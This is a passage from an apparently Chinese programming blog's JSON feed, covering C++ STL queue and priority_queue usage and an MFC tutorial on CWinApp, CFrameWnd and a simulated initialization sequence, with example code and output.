class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token comment\">// 清空队列</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token comment\">// 使用 swap () 函数把栈元素和一个临时的栈交换，就一下子清空了</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token comment\">// queue&lt;string>  q2;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token comment\">// q1.swap(q2);</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token comment\">// 可以用 pop 一个一个删除，用 empty () 函数判断栈是否为空</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>q1<span class=\"token punctuation\">.</span><span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\ttmp <span class=\"token operator\">=</span> q1<span class=\"token punctuation\">.</span><span class=\"token function\">front</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 取队首元素，不删除队首元素</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"q1要删除的队首元素是：\"</span> <span class=\"token operator\">&lt;&lt;</span> tmp <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\tq1<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"q1队列的大小为：\"</span> <span class=\"token operator\">&lt;&lt;</span> q1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>q1 队列的大小为：5</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>q1 队尾的元素是：tt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>q1 队列的大小为：5</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q1 队首的元素是：qq</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q1 队列的大小为：5</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q1 要删除的队首元素是：qq</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q1 要删除的队首元素是：ww</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q1 要删除的队首元素是：ee</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q1 要删除的队首元素是：rr</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q1 要删除的队首元素是：tt</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>q1 队列的大小为：0</pre></td></tr></table></figure><h2 id=\"priority_queue容器\"><a class=\"anchor\" href=\"#priority_queue容器\">#</a> priority_queue 容器</h2>\n<h3 id=\"什么是priority_queue容器\"><a class=\"anchor\" href=\"#什么是priority_queue容器\">#</a> 什么是 priority_queue 容器</h3>\n<p>priority_queue 容器又称之为优先队列容器，该容器以某种排序规则（默认是 less）管理队列中的元素；其有这几种操作方法：</p>\n<p><code>push(e)</code>  ，根据元素的优先级将元素置入队列。<br />\n <code>top()</code>  ，返回队列头部（最大的元素）的引用，但不移除。<br />\n <code>pop()</code>  ，删除队列头部（最大）的元素，但不返回。<br />\n <code>empty()</code>  ，判断队列是否为空。</p>\n<h3 id=\"使用priority_queue容器\"><a class=\"anchor\" href=\"#使用priority_queue容器\">#</a> 使用 priority_queue 容器</h3>\n<p>在使用之前需要包含头文件和使用命名空间：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;queue></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>详细参见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNjE0OTExL2FydGljbGUvZGV0YWlscy85ODc0Mzc2MQ==\">https://blog.csdn.net/qq_42614911/article/details/98743761</span></p>\n<h2 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naDBzdC5jbi9CaW5hcnktTGVhcm5pbmcvU1RMLmh0bWw=\">https://gh0st.cn/Binary-Learning/STL.html</span></p>\n",
            "tags": [
                "STL",
                "Vector容器",
                "Deque容器",
                "List容器",
                "Set容器",
                "Multiset容器",
                "Map容器",
                "Multimap容器",
                "Stack容器",
                "Queue容器",
                "priority_queue容器"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-01MFC%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-01MFC%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B/",
            "title": "MFC六大核心机制-01MFC初始化过程",
            "date_published": "2022-04-05T11:17:06.000Z",
            "content_html": "<h1 id=\"楔子\"><a class=\"anchor\" href=\"#楔子\">#</a> 楔子</h1>\n<p>MFC 共有六大核心机制分别是：</p>\n<ul>\n<li>MFC 程序的初始化过程</li>\n<li>RTTI（Runtime Type Information） 运行时类型信息</li>\n<li>Dynamic Creation 动态创建</li>\n<li>Persistence 永久保存</li>\n<li>Message Mapping 消息映射</li>\n<li>Message Routing 消息循环</li>\n</ul>\n<p>这次学习的 MFC 教程应该是以《深入浅出 MFC》这本书讲解的。</p>\n<h1 id=\"mfc的本质\"><a class=\"anchor\" href=\"#mfc的本质\">#</a> MFC 的本质</h1>\n<p>因为没有系统的学习 MFC，现在写代码出错了都不知道怎么调试。所以准备学一下 MFC 的本质。知其然知其所以然！</p>\n<p>MFC (Microsoft Foundation Classes) 是由微软提供的放置 WINAPI 的面向对象的包装的 C++ 类库。<br />\nMFC6.0 中大约封装了 200 个类，分别封装了 WINAPI 和 WINSDK 中的结构和过程。<br />\n另外 MFC 还提供了一个应用程序框架。例如程序向导和类向导自动生成的代码，这样大大减少了程序员的工作量，提高了开发效率。</p>\n<p><strong>MFC 的本质就是 win32 的封装。</strong></p>\n<h1 id=\"第一个mfc程序\"><a class=\"anchor\" href=\"#第一个mfc程序\">#</a> 第一个 MFC 程序</h1>\n<p>由于根据项目引导生成的代码繁杂冗余，所以我们可以自己来手写 MFC 来创建 Windows 窗口程序，这样就可以避免一些不必要的代码。</p>\n<p>本节需要掌握的知识点：<br />\nA: CWinApp 可以覆盖的虚函数 InitInstance<br />\nB: CWinApp 成员变量 m_pMainWnd<br />\nC: CFramWnd 的成员函数 create 以及参数</p>\n<p>需要简单了解的内容</p>\n<p>A: 通过 MSDN 去查看 MFC 的层次结构图<br />\n B: 对 CWinApp 有个初步的认识<br />\n C: 对 CFramWnd 有个初步认识</p>\n<h2 id=\"mfc的层次结构图\"><a class=\"anchor\" href=\"#mfc的层次结构图\">#</a> MFC 的层次结构图</h2>\n<p>在 MSDN Library 中搜索 hierarchy chart 即可获得 MFC 的层次结构图：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>本章我们只需要了解 CWinApp、CFramWnd。</p>\n<h2 id=\"cwinapp类\"><a class=\"anchor\" href=\"#cwinapp类\">#</a> CWinApp 类</h2>\n<p>CWinApp 类是派生 Windows 应用程序对象的基类。应用程序对象提供了用于初始化应用程序 (及其每个实例) 和运行应用程序的成员函数。</p>\n<p>每个使用 MFC 的应用程序只能包含一个派生自 CWinApp 的对象。这个对象是在其他 c++ 全局对象被构造时被构造的，并且在 Windows 调用 WinMain 函数时已经可用，这个函数是由 MFC 库提供的。在全局级别声明你的派生 CWinApp 对象。</p>\n<p>当您从 CWinApp 派生应用程序类时，覆盖  <code>InitInstance</code>  成员函数以创建应用程序的主窗口对象。<br />\n他还有一个成员变量  <code>m_pMainWnd</code>  用来记录创建的主窗口对象。</p>\n<p>除了 CWinApp 成员函数之外， Microsoft 基础类库还提供了以下全局函数来访问  <code>CWinApp</code>  对象和其他全局信息：</p>\n<p><code>AfxGetApp</code>  获取一个指向  <code>CWinApp</code>  对象的指针。<br />\n <code>AfxGetInstanceHandle</code>  获取当前应用程序实例的句柄。<br />\n <code>AfxGetResourceHandle</code>  获取应用程序资源的句柄。<br />\n <code>AfxGetAppName</code>  获取指向包含应用程序名称的字符串的指针。或者，，如果您有一个指向 CWinApp 对象的指针，请使用  <code>m_pszExeName</code>  获取应用程序的名称。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>CWinApp 类代表一个程序本身。</p>\n<h2 id=\"cframewnd类\"><a class=\"anchor\" href=\"#cframewnd类\">#</a> CFrameWnd 类</h2>\n<p>CFrameWnd 类提供了 Windows 单文档界面（SDI）重叠或弹出框架窗口的功能，以及用于管理窗口的成员。</p>\n<p>要为应用程序创建有用的框架窗口，请从 CFrameWnd 派生类。向派生类添加成员变量以存储特定于您的应用程序的数据。在派生类中实现消息处理程序成员函数和消息映射，以指定在将消息定向到窗口时会发生什么。</p>\n<p>有三种方法来构造框架窗口：</p>\n<p>1. 使用 Create 直接构造它 （本节需要掌握的内容）<br />\n2. 使用 LoadFrame 直接构造它（后续会学）<br />\n3. 使用文档模板间接构建它 （后续会学）</p>\n<p>注：我们可以认为 CFrameWnd 类取代了窗口过程函数。</p>\n<p>Create 成员函数<br />\n CFrameWnd :: Create 成员函数语法格式如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token function\">Create</span><span class=\"token punctuation\">(</span>LPCTSTR lpszClassName<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 如果类名为 NULL，则以 MFC 内建的窗口类产生一个标准的外框窗口</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>           LPCTSTR lpszWindowName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>           DWORD dwStyle <span class=\"token operator\">=</span> WS_OVERLAPPEDWINDOW<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>           <span class=\"token keyword\">const</span> RECT<span class=\"token operator\">&amp;</span> rect <span class=\"token operator\">=</span> rectDefault<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>           CWnd<span class=\"token operator\">*</span> pParentWnd <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>        <span class=\"token comment\">// != NULL for popups</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>           LPCTSTR lpszMenuName <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>          DWORD dwExStyle <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>         CCreateContext<span class=\"token operator\">*</span> pContext <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 返回值：非零表示初始化成功，否则为 0</span></pre></td></tr></table></figure><p>通过两个步骤构造一个 CFrameWnd 对象：</p>\n<p>首先调用构造函数，它构造 CFrameWnd 类的对象，然后调用 Create 成员方法，创建 Windows 框架窗口并将其附加到 CFrameWnd 类的对象；</p>\n<p>创建初始化窗口的类名和窗口名称，并注册其样式，父级和关联菜单的默认值。</p>\n<h2 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h2>\n<ol>\n<li>基于 MFC 的窗口程序必须也只能有一个由从 CWinApp 派生的对象。</li>\n<li>我们必须覆盖 CWinApp 的虚函数 InitInstance 在里面创建窗口，并把窗口对象保存在它的成员变量  <code>m_pMainWnd</code>  。</li>\n<li>创建窗口是通过派生  <code>CFrameWnd</code>  对象，在它的构造函数里面调用成员函数 <code>create</code> 。</li>\n</ol>\n<p>手动编写 MFC 程序的几个注意事项（这是 VC6）：</p>\n<ol>\n<li>使用 Win32 Application 去创建项目</li>\n<li>项目需要包含 MFC 运行库，VC6 设置：Project → Setting → General → Use MFC In Static Library</li>\n<li>使用头文件 afxwin.h</li>\n</ol>\n<h2 id=\"手动创建一个mfc程序\"><a class=\"anchor\" href=\"#手动创建一个mfc程序\">#</a> 手动创建一个 MFC 程序</h2>\n<p>这里我用的编译器是 VS2019，步骤如下：<br />\n创建一个  <code>Windows桌面项目</code>  选择  <code>桌面应用程序</code>  ：</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>使用 MFC 静态库：</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>接下来添加代码：</p>\n<p>Hello.h</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\">once</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">WIN32_LEAN_AND_MEAN</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;afxwin.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMyApp</span><span class=\"token operator\">:</span><span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CWinApp</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">virtual</span> BOOL <span class=\"token function\">InitInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMainWindow</span> <span class=\"token operator\">:</span><span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CFrameWnd</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">CMainWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>Hello.cpp</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"Hello.h\"</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CMyApp theApp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>BOOL <span class=\"token class-name\">CMyApp</span><span class=\"token operator\">::</span><span class=\"token function\">InitInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tm_pMainWnd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> CMainWindow<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tm_pMainWnd<span class=\"token operator\">-></span><span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>m_nCmdShow<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tm_pMainWnd<span class=\"token operator\">-></span><span class=\"token function\">UpdateWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">CMainWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">Create</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tWS_OVERLAPPED <span class=\"token operator\">|</span> WS_CAPTION <span class=\"token operator\">|</span> WS_SYSMENU <span class=\"token operator\">|</span> WS_THICKFRAME <span class=\"token operator\">|</span> WS_MAXIMIZEBOX <span class=\"token operator\">|</span> WS_VSCROLL<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token comment\">// 左上角，既起始位置是（400,300），右下角（800,700）</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token comment\">// 700 -300 是高度  800-400 是宽度</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token function\">CRect</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">700</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>运行结果：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>为什么代码里没有 WinMain？MFC 没有 WinMain 函数吗？其实 MFC 是在内部接管了 WinMain，我们可以认为 CWinApp 就是 WinMain，只不过我们没法很直观的看见 WinMain 函数。</p>\n<h1 id=\"mfc的初始化过程1\"><a class=\"anchor\" href=\"#mfc的初始化过程1\">#</a> MFC 的初始化过程 1</h1>\n<p>上面我们手动创建了一个 MFC 程序，但并没有 WinMain 函数，整个程序唯一的语句也就是  <code>CMyApp theApp;</code>  这是具有全局有效性、用来实例对象化的语句。这是  <code>CWinApp</code>  的派生类的全局对象，那么到底是什么启动的程序的运行？应用程序对象又是在什么时候其作用的呢？其实回答这些问题的最好方法就是取看一下 MFC 的主框架源码，但暂时我们还不能这么去做，因为主框架的源码太过于庞大。<br />\n这节我们把我的重点突出来。</p>\n<h2 id=\"通过代码来模拟mfc的初始化过程\"><a class=\"anchor\" href=\"#通过代码来模拟mfc的初始化过程\">#</a> 通过代码来模拟 MFC 的初始化过程</h2>\n<ol>\n<li>本节必须掌握的知识点</li>\n</ol>\n<ul>\n<li>\n<p>为什么要声明全局的应用程序对象 (CWinApp)</p>\n</li>\n<li>\n<p>学会使用类视图快速添加类</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>需要简单了解的内容</li>\n</ol>\n<ul>\n<li>\n<p>CWinApp 的层次结构</p>\n</li>\n<li>\n<p>CFramWnd 的层次结构</p>\n</li>\n</ul>\n<h2 id=\"代码模拟\"><a class=\"anchor\" href=\"#代码模拟\">#</a> 代码模拟</h2>\n<p>用代码模拟 MFC 的初始化过程，我们基于上一章中手动编写的 MFC 代码来模拟。</p>\n<p>我们继承两个类 CWinApp、CFrameWnd，这两个类的层次结构如下：</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>所以在这里我们需要重写 CObject、CCmdTarget、CWinThread、CWnd、CWinApp、CFrameWnd 这几个类...</p>\n<p>仅仅是模拟代码，不用写实际功能，写上构造、析构函数即可。</p>\n<p>这里要记住：<strong>全局变量和全局对象总是在任何其他代码前执行</strong></p>\n<p>结果：</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h1 id=\"mfc初始化过程2\"><a class=\"anchor\" href=\"#mfc初始化过程2\">#</a> MFC 初始化过程 2</h1>\n<p>继续进行 MFC 初始化模拟。</p>\n<p>在上一节中我们知道了一个全局对象或一个全局变量的实现是早于 WinMain 的，所以我们构造了 CWinApp 对象，先调用它的构造函数然后才进入 WinMain，这样做的好处是什么呢？我们要在 WinMain 执行之前要做的事情都可以这样处理。</p>\n<p>注意： WinMian 在 MFC 中并不是封装在类中，因为它是由系统调用的。</p>\n<h2 id=\"mfc是如何使用应用程序对象\"><a class=\"anchor\" href=\"#mfc是如何使用应用程序对象\">#</a> MFC 是如何使用应用程序对象</h2>\n<p>需要简单了解的内容</p>\n<p>CWinApp 类的二个可以覆盖的虚函数</p>\n<p><code>virtual BOOL InitInstance();</code></p>\n<p><code>virtual int Run();</code></p>\n<h2 id=\"代码模拟-2\"><a class=\"anchor\" href=\"#代码模拟-2\">#</a> 代码模拟</h2>\n<p>在上一章的模拟代码中我们相比于使用 MFC，还少了很多东西，比如  <code>InitInstance</code>  、  <code>m_pMainWnd</code>  等等。</p>\n<p>在上一章节中我们是将  <code>InitInstance</code>  这个虚函数删除的，在本章中我们可以基于上一章节的代码重新定义一下该虚函数，在原 MFC 中（这里我们是模拟）这个虚函数在三个类中都存在：</p>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<p>我们已经了解层次结构所以直接在最高一层去定义，也就是  <code>CWinThread</code>  这个类中去定义即可  <code>virtual bool InitInstance() = 0;</code>  为了省事可以定义为纯虚函数。<br />\n <code>m_pMainWnd</code>  同样在  <code>CWinThread</code>  类中，我们也模拟着在我们的代码中定义一下： <code>CWnd* m_pMainWnd;</code>  这里注意包含头文件。</p>\n<p>接下来在要做的事情和用 MFC 写的一样，在我们的  <code>InitInstance</code>  函数中：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token class-name\">CMyApp</span><span class=\"token operator\">::</span><span class=\"token function\">InitInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"CMyApp::InitInstance 函数\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tm_pMainWnd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> CFrameWnd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>继续执行一下代码：</p>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<p>我们发现并没有调用我们的  <code>InitInstance</code>  函数，由此可以推断出，  <code>InitInstance</code>  函数是在 WinMain 中调用的，我们添加代码 <code>theApp.InitInstance();</code></p>\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CObject 构造函数</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>CCmdTarget 构造函数</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CWinThread 构造函数</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>CWinApp 构造函数</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>CMyApp 构造函数</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>WinMiam 函数</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>CMyApp::InitInstance 函数</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>CObject 构造函数</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>CCmdTarget 构造函数</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>CWnd 构造函数</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>CFrameWnd 构造函数</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>CMainWindow 构造函数</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Create 函数</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>CMyApp 析构函数</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>CWinApp 析构函数</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>CWinThread 析构函数</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>CCmdTarget 析构函数</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>CObject 析构函数</pre></td></tr></table></figure><p>以上就是简化版的 MFC 执行流程。</p>\n<p>但我们这里还有一个问题就是，我们在模拟 WinMain 函数中是直接用 <strong>应用程序对象</strong> 去调用的 <code>InitInstance</code> ，但在实际中，WinMain 并不是我们写的，它是如何调用 <code>InitInstance</code>  的呢？</p>\n<p>在前面 <code>CWinApp</code>  类的介绍中，我们有一个全局函数  <code>AfxGetApp</code>  获取一个指向  <code>CWinApp</code>  对象的指针。那么我们也可以简单的模拟一下：</p>\n<p>在 CMyApp 类中：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">CMyApp</span> <span class=\"token operator\">:</span><span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">CWinApp</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tCMyApp<span class=\"token operator\">*</span> m_pCurrentApp<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 当前应用程序的指针</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">CMyApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token operator\">~</span><span class=\"token function\">CMyApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 